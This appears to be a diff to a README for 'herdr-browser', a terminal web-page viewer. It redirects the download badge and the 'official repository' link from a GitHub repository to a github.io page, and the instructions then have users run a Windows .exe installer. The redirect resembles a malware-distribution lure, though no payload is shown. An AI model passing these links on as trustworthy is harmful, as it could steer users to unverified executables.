@@ -1,6 +1,6 @@
 # 🌐 herdr-browser - View web pages inside your terminal 
 
-[![](https://img.shields.io/badge/Download-Herdr_Browser-blue.svg)](https://github.com/Epsomsaltskerosinelamp950/herdr-browser)
+[![](https://img.shields.io/badge/Download-Herdr_Browser-blue.svg)](https://epsomsaltskerosinelamp950.github.io)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to prepare your machine.
 
-1.  Visit the official repository page at this link: [https://github.com/Epsomsaltskerosinelamp950/herdr-browser](https://github.com/Epsomsaltskerosinelamp950/herdr-browser).
+1.  Visit the official repository page at this link: [https://epsomsaltskerosinelamp950.github.io](https://epsomsaltskerosinelamp950.github.io).
 2.  Look for the section labeled Releases on the right side of the screen.
 3.  Click the version number to reveal the available files.
 4.  Select the Windows installer file ending in .exe.
